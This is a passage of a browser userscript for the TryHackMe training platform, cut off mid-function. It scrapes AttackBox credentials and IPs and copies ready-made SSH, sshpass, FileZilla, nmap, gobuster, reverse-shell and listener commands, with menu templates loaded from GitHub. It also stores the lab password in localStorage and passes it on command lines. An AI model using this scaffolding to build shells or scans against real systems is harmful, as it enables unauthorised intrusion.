// ==UserScript==
// @name         TryHackMe AttackBox Command Helper
// @namespace    https://tryhackme.com/
// @version      1.16
// @description  Movable command bar for AttackBox SSH, FileZilla/SCP transfer, target IP, nmap, gobuster, reverse shell, and listener commands
// @match        https://tryhackme.com/*
// @grant        GM_setClipboard
// @grant        GM_xmlhttpRequest
// @connect      raw.githubusercontent.com
// ==/UserScript==

(function () {
    'use strict';

    const baseCacheKey = 'thm_attackbox_info_cache';
    const reverseShellPortKey = 'thm_reverse_shell_port';
    const barPositionKey = 'thm_helper_bar_position';
    const barMinimizedKey = 'thm_helper_bar_minimized';
    const menuCacheKey = 'thm_helper_remote_menus';
    const menuCacheMaxAgeMs = 15 * 60 * 1000;
    const MENU_CONFIG_URL =
        'https://raw.githubusercontent.com/garthheff/' +
        'tryhackme-attackbox-command-helper/main/menus.json';
    const buttonResetTimers = new WeakMap();
    const serviceDefaults = { http: '80', https: '443', ftp: '21', ssh: '22' };
    const wordlistChoices = {
        web: [
            ['DIRB common — 4,614 lines', '/usr/share/wordlists/dirb/common.txt'],
            ['DIRB big — 20,469 lines', '/usr/share/wordlists/dirb/big.txt'],
            ['DirBuster small — 87,664 lines', '/usr/share/wordlists/dirbuster/directory-list-2.3-small.txt'],
            ['DirBuster medium — 218,275 lines', '/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt'],
            ['SecLists common — 4,655 lines', '/usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt'],
            ['RAFT small words — 43,003 lines', '/usr/share/wordlists/SecLists/Discovery/Web-Content/raft-small-words.txt'],
            ['RAFT medium directories — 30,000 lines', '/usr/share/wordlists/SecLists/Discovery/Web-Content/raft-medium-directories.txt']
        ],
        dns: [
            ['Subdomains top 5,000', '/usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt'],
            ['Subdomains top 20,000', '/usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-20000.txt'],
            ['Subdomains top 110,000', '/usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-110000.txt']
        ]
    };

    function getWordlist(kind) {
        return localStorage.getItem('thm_wordlist:' + kind) || wordlistChoices[kind][0][1];
    }

    function promptForWordlist(kind) {
        const current = getWordlist(kind);
        const value = prompt(
            'Custom ' + kind + ' wordlist absolute path:', current
        );
        if (value === null) return;
        const entered = value.trim();
        const path = entered;
        if (!path.startsWith('/') || /[\r\n\0]/.test(path)) {
            alert('Enter an absolute wordlist path.');
            return;
        }
        localStorage.setItem('thm_wordlist:' + kind, path);
    }

    function getServicePort(service) {
        const saved = localStorage.getItem('thm_service_port:' + service);
        return saved && /^\d+$/.test(saved) && Number(saved) >= 1 &&
            Number(saved) <= 65535 ? saved : serviceDefaults[service];
    }

    function promptForServicePort(service) {
        const value = prompt(service.toUpperCase() + ' port:', getServicePort(service));
        if (value === null) return;
        const port = value.trim();
        if (!/^\d+$/.test(port) || Number(port) < 1 || Number(port) > 65535) {
            alert('Enter a valid port from 1 to 65535.');
            return;
        }
        localStorage.setItem('thm_service_port:' + service, String(Number(port)));
    }

    function getServiceValues() {
        const info = getInfo();
        return {
            wordlist: shellQuote(getWordlist('web')),
            dnsWordlist: shellQuote(getWordlist('dns')),
            httpPort: getServicePort('http'), httpsPort: getServicePort('https'),
            ftpPort: getServicePort('ftp'), sshPort: getServicePort('ssh'),
            httpUrl: 'http://' + info.targetIp + ':' + getServicePort('http'),
            httpsUrl: 'https://' + info.targetIp + ':' + getServicePort('https'),
            ftpUrl: 'ftp://' + info.targetIp + ':' + getServicePort('ftp')
        };
    }
    let remoteMenuConfig = null;

    function isMenuConfigUrlConfigured() {
        return (
            /^https:\/\/raw\.githubusercontent\.com\//.test(
                MENU_CONFIG_URL
            ) &&
            MENU_CONFIG_URL.indexOf('YOUR_GITHUB_USERNAME') === -1 &&
            MENU_CONFIG_URL.indexOf('YOUR_REPOSITORY') === -1
        );
    }

    function validateMenuConfig(value) {
        if (!value || typeof value !== 'object' || Array.isArray(value)) {
            throw new Error('Menu config must be a JSON object.');
        }

        const allowedContexts = [
            'targetPorts',
            'target',
            'reverse',
            'listener',
            'attackbox',
            'setPort',
            'raw'
        ];
        const clean = {};

        Object.keys(value).forEach(function (menuName) {
            if (!Array.isArray(value[menuName])) {
                throw new Error(menuName + ' must contain an array.');
            }

            clean[menuName] = value[menuName].map(function (item) {
                if (!item || typeof item !== 'object') {
                    throw new Error(menuName + ' contains an invalid item.');
                }

                if (typeof item.heading === 'string') {
                    return { heading: item.heading.slice(0, 100) };
                }

                if (item.separator === true) {
                    return { separator: true };
                }

                if (
                    typeof item.label !== 'string' ||
                    (item.context !== 'setPort' &&
                        typeof item.command !== 'string') ||
                    allowedContexts.indexOf(item.context || 'raw') === -1
                ) {
                    throw new Error(
                        menuName + ' contains an invalid command item.'
                    );
                }

                return {
                    label: item.label.slice(0, 100),
                    description:
                        typeof item.description === 'string'
                            ? item.description.slice(0, 500)
                            : '',
                    context: item.context || 'raw',
                    command: item.command || '',
                    requirePassword: item.requirePassword === true
                };
            });
        });

        return clean;
    }

    function readMenuCache() {
        try {
            const cached = JSON.parse(
                localStorage.getItem(menuCacheKey) || 'null'
            );

            if (!cached || !cached.savedAt || !cached.menus) {
                return null;
            }

            return cached;
        } catch (error) {
            return null;
        }
    }

    function fetchRemoteMenus() {
        return new Promise(function (resolve, reject) {
            GM_xmlhttpRequest({
                method: 'GET',
                url: MENU_CONFIG_URL,
                timeout: 10000,
                headers: { Accept: 'application/json' },
                onload: function (response) {
                    if (response.status < 200 || response.status >= 300) {
                        reject(
                            new Error('GitHub returned ' + response.status)
                        );
                        return;
                    }

                    try {
                        resolve(
                            validateMenuConfig(
                                JSON.parse(response.responseText)
                            )
                        );
                    } catch (error) {
                        reject(error);
                    }
                },
                onerror: function () {
                    reject(new Error('Could not reach GitHub.'));
                },
                ontimeout: function () {
                    reject(new Error('GitHub request timed out.'));
                }
            });
        });
    }

    async function loadRemoteMenus() {
        if (!isMenuConfigUrlConfigured()) {
            console.info(
                '[THM helper] Set MENU_CONFIG_URL to enable GitHub menus.'
            );
            return;
        }

        const cached = readMenuCache();

        if (
            cached &&
            Date.now() - cached.savedAt < menuCacheMaxAgeMs
        ) {
            try {
                remoteMenuConfig = validateMenuConfig(cached.menus);
                return;
            } catch (error) {
                localStorage.removeItem(menuCacheKey);
            }
        }

        try {
            remoteMenuConfig = await fetchRemoteMenus();
            localStorage.setItem(
                menuCacheKey,
                JSON.stringify({
                    savedAt: Date.now(),
                    menus: remoteMenuConfig
                })
            );
            console.info('[THM helper] Loaded menus from GitHub.');
        } catch (error) {
            console.warn(
                '[THM helper] GitHub menus unavailable; using fallback.',
                error
            );

            if (cached) {
                try {
                    remoteMenuConfig = validateMenuConfig(cached.menus);
                } catch (cacheError) {
                    remoteMenuConfig = null;
                }
            }
        }
    }

    function isRoomPage() {
        return /^https:\/\/tryhackme\.com\/room\/[^/]+/.test(
            window.location.href
        );
    }

    function getRoomCacheKey() {
        return baseCacheKey + ':' + window.location.pathname;
    }

    function readCache() {
        try {
            return JSON.parse(
                localStorage.getItem(getRoomCacheKey()) || '{}'
            );
        } catch (error) {
            return {};
        }
    }

    function writeCache(info) {
        const old = readCache();
        const fresh = {};

        Object.keys(info).forEach(function (key) {
            if (info[key]) {
                fresh[key] = info[key];
            }
        });

        const merged = Object.assign({}, old, fresh);

        localStorage.setItem(
            getRoomCacheKey(),
            JSON.stringify(merged)
        );

        return merged;
    }

    function sleep(ms) {
        return new Promise(function (resolve) {
            setTimeout(resolve, ms);
        });
    }

    function getByTestId(id) {
        const element = document.querySelector(
            '[data-testid="' + id + '"]'
        );

        return element
            ? element.innerText.trim()
            : null;
    }

    function findFromText(regex) {
        const text = document.body.innerText || '';
        const match = text.match(regex);

        return match ? match[1].trim() : null;
    }

    function clickElement(element) {
        if (!element) {
            return false;
        }

        [
            'pointerover',
            'pointerenter',
            'mouseover',
            'mouseenter',
            'pointerdown',
            'mousedown',
            'pointerup',
            'mouseup',
            'click'
        ].forEach(function (type) {
            element.dispatchEvent(
                new MouseEvent(type, {
                    bubbles: true,
                    cancelable: true
                })
            );
        });

        return true;
    }

    function shellQuote(value) {
        return "'" + String(value).replace(/'/g, "'\"'\"'") + "'";
    }

    function getReverseShellPort() {
        return localStorage.getItem(reverseShellPortKey) || '4444';
    }

    function setReverseShellPort(port) {
        localStorage.setItem(reverseShellPortKey, port);
    }

    function promptForPort() {
        const currentPort = getReverseShellPort();

        const newPort = prompt(
            'Reverse shell/listener port:',
            currentPort
        );

        if (newPort === null) {
            return null;
        }

        const cleanedPort = newPort.trim();

        if (
            !/^\d+$/.test(cleanedPort) ||
            Number(cleanedPort) < 1 ||
            Number(cleanedPort) > 65535
        ) {
            alert('Enter a valid port from 1 to 65535.');
            return null;
        }

        setReverseShellPort(cleanedPort);

        return cleanedPort;
    }

    function closeAttackBoxOverlay() {
        const overlay = document.querySelector(
            '[data-testid="rtl-overlay"]'
        );

        if (!overlay) {
            return false;
        }

        const closeButton =
            overlay.querySelector('button[color="secondaryDark"]') ||
            overlay.querySelector('button.elrJRL') ||
            Array.from(overlay.querySelectorAll('button'))
                .find(function (button) {
                    return (button.innerText || '')
                        .trim()
                        .toLowerCase() === 'close';
                });

        if (!closeButton) {
            return false;
        }

        clickElement(closeButton);
        return true;
    }

    async function lazyLoadAttackBoxInfo() {
        const infoIcon = document.querySelector(
            'svg[data-icon="circle-info"]'
        );

        console.log('[THM helper] circle-info icon:', infoIcon);

        if (!infoIcon) {
            alert('THM helper: could not find the circle-info icon.');
            return false;
        }

        console.log('[THM helper] Opening AttackBox info.');
        clickElement(infoIcon);

        for (let i = 0; i < 50; i++) {
            await sleep(200);

            const attackboxIp = getByTestId('private-ip');
            const username = getByTestId('username');
            const password = getByTestId('password');

            if (attackboxIp && username && password) {
                writeCache({
                    attackboxIp: attackboxIp,
                    username: username,
                    password: password
                });

                await sleep(300);
                closeAttackBoxOverlay();

                return true;
            }
        }

        alert('THM helper: opened info box but could not read password.');
        return false;
    }

    function getInfo() {
        const cached = readCache();

        const freshAttackboxIp =
            getByTestId('private-ip') ||
            findFromText(
                /Private IP\s+(\d{1,3}(?:\.\d{1,3}){3})/i
            ) ||
            null;

        const freshTargetIp =
            findFromText(
                /Target IP Address:?\s+(\d{1,3}(?:\.\d{1,3}){3})/i
            ) ||
            findFromText(
                /Target Machine Information[\s\S]{0,400}?(\d{1,3}(?:\.\d{1,3}){3})/i
            ) ||
            null;

        const freshUsername =
            getByTestId('username') ||
            null;

        const freshPassword =
            getByTestId('password') ||
            null;

        const info = {
            attackboxIp:
                freshAttackboxIp ||
                cached.attackboxIp ||
                null,

            targetIp:
                freshTargetIp ||
                cached.targetIp ||
                null,

            username:
                freshUsername ||
                cached.username ||
                'root',

            password:
                freshPassword ||
                cached.password ||
                null
        };

        writeCache({
            attackboxIp: freshAttackboxIp,
            targetIp: freshTargetIp,
            username: freshUsername,
            password: freshPassword
        });

        return info;
    }

    async function getInfoWithAttackBoxLoaded() {
        const cached = readCache();
        delete cached.attackboxIp;
        delete cached.username;
        delete cached.password;
        localStorage.setItem(getRoomCacheKey(), JSON.stringify(cached));
        if (!await lazyLoadAttackBoxInfo()) {
            return { attackboxIp: null, username: null, password: null };
        }
        return getInfo();
    }

    function restoreButtonLabel(button) {
        const originalLabel = button.dataset.originalLabel;

        if (originalLabel) {
            button.innerText = originalLabel;
        }
    }

    function setButtonStatus(button, text, restoreAfterMs) {
        const oldTimer = buttonResetTimers.get(button);

        if (oldTimer) {
            clearTimeout(oldTimer);
        }

        button.innerText = text;

        if (restoreAfterMs) {
            const timer = setTimeout(function () {
                restoreButtonLabel(button);
                buttonResetTimers.delete(button);
            }, restoreAfterMs);

            buttonResetTimers.set(button, timer);
        }
    }

    function copy(value, button) {
        GM_setClipboard(value);

        if (!button.dataset.originalLabel) {
            button.dataset.originalLabel = button.innerText;
        }

        setButtonStatus(button, 'Copied', 1200);
    }

    function makeButton(label, action) {
        const button = document.createElement('button');

        button.innerText = label;
        button.dataset.originalLabel = label;
        button.style.padding = '5px 10px';
        button.style.background = '#1f6feb';
        button.style.color = 'white';
        button.style.border = '0';
        button.style.borderRadius = '6px';
        button.style.fontSize = '12px';
        button.style.fontWeight = '600';
        button.style.cursor = 'pointer';
        button.style.height = '28px';
        button.style.whiteSpace = 'nowrap';

        button.addEventListener('click', async function () {
            if (button.dataset.busy === 'true') {
                return;
            }

            button.dataset.busy = 'true';

            try {
                console.log('[THM helper] Clicked:', label);
                setButtonStatus(button, 'Working...');

                await action(button);

                if (button.innerText === 'Working...') {
                    restoreButtonLabel(button);
                }
            } catch (error) {
                console.error('[THM helper] Button failed:', label, error);
                setButtonStatus(button, 'Error', 1500);
            } finally {
                button.dataset.busy = 'false';
            }
        });

        return button;
    }

    function closeAllMenus(exceptMenu) {
        document
            .querySelectorAll('.thm-helper-popup-menu')
            .forEach(function (menu) {
                if (menu !== exceptMenu) {
                    menu.style.display = 'none';
                }
            });
    }

    function positionPopupMenu(menu, wrapper) {
        const rect = wrapper.getBoundingClientRect();
        const openDownward = rect.top < window.innerHeight / 2;
        const openRightward = rect.left < 320;

        menu.style.top = openDownward ? '34px' : 'auto';
        menu.style.bottom = openDownward ? 'auto' : '34px';
        menu.style.left = openRightward ? '0' : 'auto';
        menu.style.right = openRightward ? 'auto' : '0';
    }

    function makeBarControlButton(label, title, action) {
        const button = document.createElement('button');

        button.type = 'button';
        button.innerText = label;
        button.title = title;
        button.style.height = '28px';
        button.style.padding = '4px 8px';
        button.style.background = '#21262d';
        button.style.color = 'white';
        button.style.border = '1px solid #30363d';
        button.style.borderRadius = '6px';
        button.style.fontSize = '12px';
        button.style.fontWeight = '700';
        button.style.cursor = 'pointer';
        button.style.whiteSpace = 'nowrap';

        button.addEventListener('click', function (event) {
            event.stopPropagation();
            action(button);
        });

        return button;
    }

    function readBarPosition() {
        try {
            return JSON.parse(
                localStorage.getItem(barPositionKey) || 'null'
            );
        } catch (error) {
            return null;
        }
    }

    function saveBarPosition(bar) {
        const rect = bar.getBoundingClientRect();

        localStorage.setItem(
            barPositionKey,
            JSON.stringify({
                left: Math.round(rect.left),
                top: Math.round(rect.top)
            })
        );
    }

    function clampBarToViewport(bar, shouldSave) {
        const rect = bar.getBoundingClientRect();
        const margin = 4;
        const maxLeft = Math.max(
            margin,
            window.innerWidth - rect.width - margin
        );
        const maxTop = Math.max(
            margin,
            window.innerHeight - rect.height - margin
        );
        const left = Math.min(Math.max(rect.left, margin), maxLeft);
        const top = Math.min(Math.max(rect.top, margin), maxTop);

        bar.style.left = Math.round(left) + 'px';
        bar.style.top = Math.round(top) + 'px';
        bar.style.right = 'auto';
        bar.style.bottom = 'auto';

        if (shouldSave) {
            saveBarPosition(bar);
        }
    }

    function applySavedBarPosition(bar) {
        const position = readBarPosition();

        if (!position) {
            return;
        }

        if (
            Number.isFinite(position.left) &&
            Number.isFinite(position.top)
        ) {
            bar.style.left = position.left + 'px';
            bar.style.top = position.top + 'px';
            bar.style.right = 'auto';
            bar.style.bottom = 'auto';

            requestAnimationFrame(function () {
                clampBarToViewport(bar, true);
            });
        }
    }

    function resetBarPosition(bar) {
        localStorage.removeItem(barPositionKey);
        bar.style.left = 'auto';
        bar.style.top = 'auto';
        bar.style.right = '130px';
        bar.style.bottom = '5px';
    }

    function enableBarDragging(bar, handle) {
        let dragging = false;
        let startPointerX = 0;
        let startPointerY = 0;
        let startLeft = 0;
        let startTop = 0;

        function stopDragging(event) {
            if (!dragging) {
                return;
            }

            dragging = false;
            handle.style.cursor = 'grab';
            document.body.style.userSelect = '';

            if (event && handle.releasePointerCapture) {
                try {
                    handle.releasePointerCapture(event.pointerId);
                } catch (error) {
                    // The pointer may already have been released.
                }
            }

            saveBarPosition(bar);
        }

        handle.addEventListener('pointerdown', function (event) {
            if (event.button !== 0) {
                return;
            }

            event.preventDefault();
            event.stopPropagation();

            const rect = bar.getBoundingClientRect();

            dragging = true;
            startPointerX = event.clientX;
            startPointerY = event.clientY;
            startLeft = rect.left;
            startTop = rect.top;

            bar.style.left = rect.left + 'px';
            bar.style.top = rect.top + 'px';
            bar.style.right = 'auto';
            bar.style.bottom = 'auto';

            handle.style.cursor = 'grabbing';
            document.body.style.userSelect = 'none';

            if (handle.setPointerCapture) {
                handle.setPointerCapture(event.pointerId);
            }
        });

        handle.addEventListener('pointermove', function (event) {
            if (!dragging) {
                return;
            }

            const margin = 4;
            const nextLeft =
                startLeft + event.clientX - startPointerX;
            const nextTop =
                startTop + event.clientY - startPointerY;
            const maxLeft = Math.max(
                margin,
                window.innerWidth - bar.offsetWidth - margin
            );
            const maxTop = Math.max(
                margin,
                window.innerHeight - bar.offsetHeight - margin
            );

            bar.style.left =
                Math.min(Math.max(nextLeft, margin), maxLeft) + 'px';
            bar.style.top =
                Math.min(Math.max(nextTop, margin), maxTop) + 'px';
        });

        handle.addEventListener('pointerup', stopDragging);
        handle.addEventListener('pointercancel', stopDragging);

        handle.addEventListener('dblclick', function (event) {
            event.preventDefault();
            event.stopPropagation();
            resetBarPosition(bar);
        });
    }

    function setBarMinimized(
        bar,
        content,
        minimizeButton,
        maximizeButton,
        minimized
    ) {
        content.style.display = minimized ? 'none' : 'flex';
        minimizeButton.style.display = minimized ? 'none' : 'inline-flex';
        maximizeButton.style.display = minimized ? 'inline-flex' : 'none';

        localStorage.setItem(
            barMinimizedKey,
            minimized ? 'true' : 'false'
        );

        requestAnimationFrame(function () {
            clampBarToViewport(bar, true);
        });
    }

    function makeMenuButton(label, options) {
        if (label === 'Gobuster') {
            options = [
                { label: 'Set web wordlist (Gobuster / FFUF)', wordlistKind: 'web' },
                { label: 'Set DNS / VHost wordlist', wordlistKind: 'dns' },
                { separator: true }
            ].concat(options);
        }
        const menuServices = { Files: ['ssh'], Gobuster: ['http', 'https'], Nmap: ['http', 'https'], FTP: ['ftp'] };
        if (menuServices[label]) {
            options = menuServices[label].map(function (service) {
                return {
                    label: 'Set ' + service.toUpperCase() + ' port',
                    action: function () { promptForServicePort(service); }
                };
            }).concat([{ separator: true }], options);
        }
        const wrapper = document.createElement('div');

        wrapper.style.position = 'relative';
        wrapper.style.display = 'inline-flex';

        const menu = document.createElement('div');

        menu.className = 'thm-helper-popup-menu';
        menu.style.position = 'absolute';
        menu.style.right = '0';
        menu.style.bottom = '34px';
        menu.style.display = 'none';
        menu.style.flexDirection = 'column';
        menu.style.gap = '4px';
        menu.style.minWidth = '285px';
        menu.style.maxHeight = '70vh';
        menu.style.overflowY = 'auto';
        menu.style.padding = '7px';
        menu.style.background = '#161b22';
        menu.style.border = '1px solid #30363d';
        menu.style.borderRadius = '8px';
        menu.style.boxShadow =
            '0 8px 24px rgba(0, 0, 0, 0.45)';
        menu.style.zIndex = '1000000';

        const button = makeButton(label + ' ▲', function () {
            const isOpen = menu.style.display === 'flex';

            closeAllMenus(menu);

            if (isOpen) {
                menu.style.display = 'none';
            } else {
                positionPopupMenu(menu, wrapper);
                menu.style.display = 'flex';
            }
        });

        options.forEach(function (option) {
            if (option.wordlistKind) {
                const kind = option.wordlistKind;
                const section = document.createElement('details');
                const summary = document.createElement('summary');
                summary.style.padding = '7px 10px';
                summary.style.color = 'white';
                summary.style.background = '#21262d';
                summary.style.borderRadius = '5px';
                summary.style.cursor = 'pointer';
                summary.style.fontSize = '12px';
                section.appendChild(summary);
                const choices = document.createElement('div');
                choices.style.display = 'flex';
                choices.style.flexDirection = 'column';
                choices.style.gap = '4px';
                choices.style.padding = '5px 0 5px 12px';
                const buttons = [];
                function updateSelection() {
                    const current = getWordlist(kind);
                    const selected = wordlistChoices[kind].find(function (choice) { return choice[1] === current; });
                    summary.innerText = option.label + ': ' + (selected ? selected[0].split(' — ')[0] : 'Custom');
                    summary.title = current;
                    buttons.forEach(function (entry) {
                        const active = entry.path === current;
                        entry.button.innerText = (active ? '✓ ' : '') + entry.label;
                        entry.button.setAttribute('aria-pressed', String(active));
                    });
                }
                wordlistChoices[kind].forEach(function (choice) {
                    const preset = makeBarControlButton(choice[0], choice[1], function () {
                        localStorage.setItem('thm_wordlist:' + kind, choice[1]);
                        updateSelection();
                        section.open = false;
                    });
                    preset.style.textAlign = 'left';
                    buttons.push({ button: preset, label: choice[0], path: choice[1] });
                    choices.appendChild(preset);
                });
                choices.appendChild(makeBarControlButton('Custom path…', 'Enter an absolute wordlist path', function () {
                    promptForWordlist(kind);
                    updateSelection();
                }));
                section.addEventListener('toggle', updateSelection);
                updateSelection();
                section.appendChild(choices);
                menu.appendChild(section);
                return;
            }
            if (option.separator) {
                const separator = document.createElement('div');

                separator.style.borderTop =
                    '1px solid #30363d';
                separator.style.margin = '3px 0';

                menu.appendChild(separator);
                return;
            }

            if (option.heading) {
                const heading = document.createElement('div');

                heading.innerText = option.heading;
                heading.style.padding = '3px 5px';
                heading.style.color = '#8b949e';
                heading.style.fontSize = '11px';
                heading.style.fontWeight = '700';
                heading.style.textTransform = 'uppercase';

                menu.appendChild(heading);
                return;
            }

            const item = document.createElement('button');

            item.innerText = option.label;
            item.dataset.originalLabel = option.label;
            item.title = option.description || '';
            item.style.padding = '7px 10px';
            item.style.background = '#21262d';
            item.style.color = 'white';
            item.style.border = '1px solid #30363d';
            item.style.borderRadius = '5px';
            item.style.fontSize = '12px';
            item.style.textAlign = 'left';
            item.style.cursor = 'pointer';
            item.style.whiteSpace = 'nowrap';

            item.addEventListener('mouseenter', function () {
                item.style.background = '#30363d';
            });

            item.addEventListener('mouseleave', function () {
                item.style.background = '#21262d';
            });

            item.addEventListener('click', async function (event) {
                event.stopPropagation();

                try {
                    await option.action(item);
                } catch (error) {
                    console.error(
                        '[THM helper] Menu action failed:',
                        option.label,
                        error
                    );
                    setButtonStatus(item, 'Error', 1500);
                }

                menu.style.display = 'none';
            });

            menu.appendChild(item);
        });

        wrapper.appendChild(button);
        wrapper.appendChild(menu);

        return wrapper;
    }

    function needAttackBoxIp(info) {
        if (!info.attackboxIp) {
            alert('Could not find AttackBox IP.');
            return true;
        }

        return false;
    }

    function needTargetIp(info) {
        if (!info.targetIp) {
            alert(
                'Could not find Target IP. ' +
                'Start the target machine or open the room panel once.'
            );

            return true;
        }

        return false;
    }

    function copyTargetCommand(button, commandBuilder) {
        const info = getInfo();

        if (needTargetIp(info)) {
            return;
        }

        copy(fillCommandTemplate(commandBuilder(info.targetIp), {}), button);
    }

    async function copyReverseShell(button, commandBuilder) {
        const info = await getInfoWithAttackBoxLoaded();

        if (needAttackBoxIp(info)) {
            return;
        }

        const port = getReverseShellPort();

        copy(commandBuilder(info.attackboxIp, port), button);
    }

    function copyListener(button, commandBuilder) {
        const port = getReverseShellPort();

        copy(commandBuilder(port), button);
    }

    function fillCommandTemplate(template, values) {
        values = Object.assign({}, getServiceValues(), values);
        return String(template).replace(
            /\{\{(targetIp|attackboxIp|username|password|port|httpPort|httpsPort|ftpPort|sshPort|httpUrl|httpsUrl|ftpUrl|wordlist|dnsWordlist|scanPorts)\}\}/g,
            function (match, key) {
                return Object.prototype.hasOwnProperty.call(values, key)
                    ? String(values[key])
                    : match;
            }
        );
    }

    function makeRemoteMenuAction(item) {
        if (item.context === 'targetPorts') {
            return function (button) {
                const info = getInfo();
                if (needTargetIp(info)) return;
                const entered = prompt('Open TCP ports from Stage 1 (comma-separated, e.g. 22,80,8080):', '22,80,8080');
                if (entered === null) return;
                const ports = entered.split(',').map(function (port) { return port.trim(); });
                if (!ports.every(function (port) {
                    return /^\d+$/.test(port) && Number(port) >= 1 && Number(port) <= 65535;
                })) {
                    alert('Enter comma-separated port numbers from 1 to 65535.');
                    return;
                }
                copy(fillCommandTemplate(item.command, {
                    targetIp: info.targetIp,
                    scanPorts: ports.map(Number).join(',')
                }), button);
            };
        }
        if (item.context === 'setPort') {
            return function () {
                promptForPort();
            };
        }

        if (item.context === 'target') {
            return function (button) {
                copyTargetCommand(button, function (targetIp) {
                    return fillCommandTemplate(item.command, {
                        targetIp: targetIp
                    });
                });
            };
        }

        if (item.context === 'reverse') {
            return function (button) {
                return copyReverseShell(button, function (attackboxIp, port) {
                    return fillCommandTemplate(item.command, {
                        attackboxIp: attackboxIp,
                        port: port
                    });
                });
            };
        }

        if (item.context === 'listener') {
            return function (button) {
                copyListener(button, function (port) {
                    return fillCommandTemplate(item.command, {
                        port: port
                    });
                });
            };
        }

        if (item.context === 'attackbox') {
            return function (button) {
                return copyAttackBoxFileCommand(
                    button,
                    function (info) {
                        return fillCommandTemplate(item.command, {
                            attackboxIp: info.attackboxIp,
                            username: info.username,
                            password: info.password || ''
                        });
                    },
                    item.requirePassword
                );
            };
        }

        return function (button) {
            copy(item.command, button);
        };
    }

    function resolveMenuOptions(menuName, fallbackOptions) {
        if (
            !remoteMenuConfig ||
            !Object.prototype.hasOwnProperty.call(
                remoteMenuConfig,
                menuName
            )
        ) {
            return fallbackOptions;
        }

        return remoteMenuConfig[menuName].map(function (item) {
            if (item.heading || item.separator) {
                return item;
            }

            return {
                label: item.label,
                description: item.description,
                action: makeRemoteMenuAction(item)
            };
        });
    }

    async function copyAttackBoxFileCommand(
        button,
        commandBuilder,
        requirePassword
    ) {
        setButtonStatus(button, 'Working...');

        const info = await getInfoWithAttackBoxLoaded();

        if (needAttackBoxIp(info)) {
            restoreButtonLabel(button);
            return;
        }

        if (requirePassword && !info.password) {
            alert('Could not find AttackBox password.');
            restoreButtonLabel(button);
            return;
        }

        copy(commandBuilder(info), button);
    }

    function getAttackBoxFileZillaUrl(info) {
        return (
            'sftp://' +
            encodeURIComponent(info.username) +
            ':' +
            encodeURIComponent(info.password) +
            '@' +
            info.attackboxIp +
            '/'
        );
    }

    function removeBarIfNotRoomPage() {
        if (!isRoomPage()) {
            const existing = document.getElementById(
                'thm-ssh-helper-bar'
            );

            if (existing) {
                existing.remove();
            }

            return true;
        }

        return false;
    }

    function addBar() {
        if (removeBarIfNotRoomPage()) {
            return;
        }

        if (document.getElementById('thm-ssh-helper-bar')) {
            return;
        }

        const bar = document.createElement('div');
        const controls = document.createElement('div');
        const content = document.createElement('div');

        bar.id = 'thm-ssh-helper-bar';
        bar.style.position = 'fixed';
        bar.style.right = '130px';
        bar.style.bottom = '5px';
        bar.style.zIndex = '999999';
        bar.style.display = 'flex';
        bar.style.gap = '5px';
        bar.style.alignItems = 'center';
        bar.style.maxWidth = 'calc(100vw - 8px)';
        bar.style.padding = '4px';
        bar.style.background = 'rgba(13, 17, 23, 0.94)';
        bar.style.border = '1px solid #30363d';
        bar.style.borderRadius = '9px';
        bar.style.boxShadow = '0 6px 20px rgba(0, 0, 0, 0.4)';

        controls.style.display = 'flex';
        controls.style.gap = '4px';
        controls.style.alignItems = 'center';
        controls.style.flexShrink = '0';

        content.style.display = 'flex';
        content.style.gap = '6px';
        content.style.alignItems = 'center';
        content.style.flexWrap = 'wrap';
        content.style.maxWidth = '1150px';
        content.style.justifyContent = 'flex-end';

        const moveHandle = makeBarControlButton(
            'Move',
            'Drag to move the command bar. Double-click to reset its position.',
            function () {}
        );

        moveHandle.style.cursor = 'grab';
        moveHandle.style.touchAction = 'none';

        const minimizeButton = makeBarControlButton(
            '−',
            'Minimise command bar',
            function () {
                closeAllMenus(null);
                setBarMinimized(
                    bar,
                    content,
                    minimizeButton,
                    maximizeButton,
                    true
                );
            }
        );

        const maximizeButton = makeBarControlButton(
            '□',
            'Restore command bar',
            function () {
                setBarMinimized(
                    bar,
                    content,
                    minimizeButton,
                    maximizeButton,
                    false
                );
            }
        );

        controls.appendChild(moveHandle);
        controls.appendChild(minimizeButton);
        controls.appendChild(maximizeButton);
        bar.appendChild(controls);
        bar.appendChild(content);

        content.appendChild(
            makeButton('SSH', async function (button) {
                const info = await getInfoWithAttackBoxLoaded();

                if (needAttackBoxIp(info)) {
                    return;
                }

                copy(
                    'ssh -p ' + getServicePort('ssh') + ' ' +
                    info.username +
                    '@' +
                    info.attackboxIp,
                    button
                );
            })
        );

        content.appendChild(
            makeButton('sshpass', async function (button) {
                const info = await getInfoWithAttackBoxLoaded();

                if (needAttackBoxIp(info)) {
                    return;
                }

                if (!info.password) {
                    alert('Could not find AttackBox password.');
                    return;
                }

                copy(
                    'sshpass -p ' +
                    shellQuote(info.password) +
                    ' ssh -p ' + getServicePort('ssh') + ' ' +
                    '-o StrictHostKeyChecking=accept-new ' +
                    info.username +
                    '@' +
                    info.attackboxIp,
                    button
                );
            })
        );

        content.appendChild(
            makeButton('AttackBox IP', async function (button) {
                const info = await getInfoWithAttackBoxLoaded();

                if (needAttackBoxIp(info)) {
                    return;
                }

                copy(info.attackboxIp, button);
            })
        );

        content.appendChild(
            makeButton('Target IP', function (button) {
                const info = getInfo();

                if (needTargetIp(info)) {
                    return;
                }

                copy(info.targetIp, button);
            })
        );

        content.appendChild(
            makeButton('Pass', async function (button) {
                const info = await getInfoWithAttackBoxLoaded();

                if (!info.password) {
                    alert('Could not find AttackBox password.');
                    return;
                }

                copy(info.password, button);
            })
        );

        const filesMenu = makeMenuButton(
            'Files',
            resolveMenuOptions('Files', [
                { heading: 'FileZilla' },
                {
                    label: 'Open FileZilla (auto-login)',
                    description:
                        'Copies a complete FileZilla SFTP command containing the cached AttackBox username and password.',
                    action: function (button) {
                        return copyAttackBoxFileCommand(
                            button,
                            function (info) {
                                return (
                                    'filezilla ' +
                                    shellQuote(
                                        getAttackBoxFileZillaUrl(info)
                                    ) +
                                    ' >/dev/null 2>&1 &'
                                );
                            },
                            true
                        );
                    }
                },
                { separator: true },
                { heading: 'SCP with password' },
                {
                    label: 'Send file to AttackBox',
                    description:
                        'Replace /LOCAL/PATH/TO/FILE and /REMOTE/DESTINATION/PATH/.',
                    action: function (button) {
